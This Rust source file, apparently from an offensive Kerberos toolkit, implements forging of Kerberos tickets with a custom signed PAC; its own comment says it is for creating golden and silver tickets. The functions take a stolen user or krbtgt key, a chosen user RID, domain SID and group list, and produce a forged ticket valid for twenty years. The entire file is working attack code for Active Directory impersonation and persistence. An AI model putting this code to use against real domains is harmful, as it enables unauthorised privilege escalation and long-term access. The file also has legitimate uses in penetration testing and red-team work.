use crate::core::{
    new_nt_principal, new_principal_or_srv_inst, new_signed_pac, Cipher,
    TicketCred,
};
use crate::KrbUser;
use chrono::{Duration, Utc};
use kerberos_asn1::{
    Asn1Object, AuthorizationDataEntry, EncTicketPart, EncryptedData,
    EncryptionKey, KerberosTime, KrbCredInfo, PrincipalName, Realm, Ticket,
    TransitedEncoding,
};
use kerberos_constants::ad_types;
use kerberos_constants::key_usages;
use kerberos_constants::principal_names;
use kerberos_constants::ticket_flags;
use kerberos_crypto::Key;
use ms_dtyp::FILETIME;
use ms_pac::PISID;

/// Creates a pair Ticket/KrbCredInfo with a custom PAC structure
/// To create golden/silver tickets ;)
pub fn craft_ticket_info(
    user: KrbUser,
    service: Option<String>,
    user_key: Key,
    user_rid: u32,
    domain_sid: PISID,
    groups: &[u32],
    etype: Option<i32>,
) -> TicketCred {
    let cipher = Cipher::generate(&user_key, &user, etype);
    let session_key = random_key(cipher.etype());
    let spn = service.unwrap_or(format!("krbtgt/{}", &user.realm));
    let sname = new_principal_or_srv_inst(&spn, &user.realm);
    let now = Utc::now();
    let expiration_time =
        now.checked_add_signed(Duration::weeks(20 * 52)).unwrap();

    let mut tkt_flags = ticket_flags::FORWARDABLE
        | ticket_flags::PROXIABLE
        | ticket_flags::RENEWABLE
        | ticket_flags::PRE_AUTHENT;

    if sname.name_type == principal_names::NT_SRV_INST {
        tkt_flags |= ticket_flags::INITIAL;
    }

    let authtime: KerberosTime = now.into();
    let starttime: KerberosTime = now.into();
    let endtime: KerberosTime = expiration_time.into();
    let renew_till: KerberosTime = expiration_time.into();
    let cname = new_nt_principal(&user.name);
    let crealm = user.realm.clone();
    let srealm = user.realm;

    let krb_cred_info = KrbCredInfo {
        key: session_key.clone(),
        prealm: Some(crealm.clone()),
        pname: Some(cname.clone()),
        flags: Some(tkt_flags.into()),
        authtime: Some(authtime.clone()),
        starttime: Some(starttime.clone()),
        endtime: Some(endtime.clone()),
        renew_till: Some(renew_till.clone()),
        srealm: Some(srealm.clone()),
        sname: Some(sname.clone()),
        caddr: None,
    };

    let ticket = craft_ticket(
        &user.name,
        user_rid,
        cname,
        crealm,
        domain_sid,
        groups,
        &cipher,
        tkt_flags,
        session_key,
        srealm,
        sname,
        authtime,
        starttime,
        endtime,
        renew_till,
    );

    return TicketCred::new(ticket, krb_cred_info);
}

/// Creates a Ticket which contains a custom PAC structure
fn craft_ticket(
    username: &str,
    user_rid: u32,
    cname: PrincipalName,
    crealm: Realm,
    domain_sid: PISID,
    groups: &[u32],
    cipher: &Cipher,
    tkt_flags: u32,
    session_key: EncryptionKey,
    srealm: Realm,
    sname: PrincipalName,
    authtime: KerberosTime,
    starttime: KerberosTime,
    endtime: KerberosTime,
    renew_till: KerberosTime,
) -> Ticket {
    let enc_ticket_part = craft_enc_ticket_part(
        username,
        user_rid,
        cname,
        crealm,
        domain_sid,
        groups,
        &cipher,
        tkt_flags,
        session_key,
        authtime,
        starttime,
        endtime,
        renew_till,
    );

    let enc_ticket_part_raw = enc_ticket_part.build();

    let encrypted_enc_ticket_part = cipher
        .encrypt(key_usages::KEY_USAGE_AS_REP_TICKET, &enc_ticket_part_raw);

    let ticket = Ticket {
        tkt_vno: 5,
        realm: srealm,
        sname: sname,
        enc_part: EncryptedData::new(
            cipher.etype(),
            Some(1),
            encrypted_enc_ticket_part,
        ),
    };

    return ticket;
}

/// Creates an EncTicketPart which contains a custom PAC structure
fn craft_enc_ticket_part(
    username: &str,
    user_rid: u32,
    cname: PrincipalName,
    crealm: Realm,
    domain_sid: PISID,
    groups: &[u32],
    cipher: &Cipher,
    tkt_flags: u32,
    session_key: EncryptionKey,
    authtime: KerberosTime,
    starttime: KerberosTime,
    endtime: KerberosTime,
    renew_till: KerberosTime,
) -> EncTicketPart {
    let signed_pac = new_signed_pac(
        username,
        user_rid,
        &crealm,
        domain_sid,
        groups,
        FILETIME::from_unix_timestamp(authtime.timestamp() as u64),
        &cipher,
    );

    let raw_signed_pac = signed_pac.build();

    let ad_win = AuthorizationDataEntry {
        ad_type: ad_types::AD_WIN2K_PACK,
        ad_data: raw_signed_pac,
    };

    let ad_relevant = AuthorizationDataEntry {
        ad_type: ad_types::AD_IF_RELEVANT,
        ad_data: vec![ad_win].build(),
    };

    let enc_ticket_part = EncTicketPart {
        flags: tkt_flags.into(),
        key: session_key,
        crealm: crealm,
        cname: cname,
        transited: TransitedEncoding::default(),
        authtime: authtime,
        starttime: Some(starttime),
        endtime: endtime,
        renew_till: Some(renew_till),
        caddr: None,
        authorization_data: Some(vec![ad_relevant]),
    };

    return enc_ticket_part;
}

fn random_key(etype: i32) -> EncryptionKey {
    return EncryptionKey {
        keytype: etype,
        keyvalue: Key::random(etype)
            .expect(&format!("Unsupported etype {}", etype))
            .as_bytes()
            .to_vec(),
    };
}
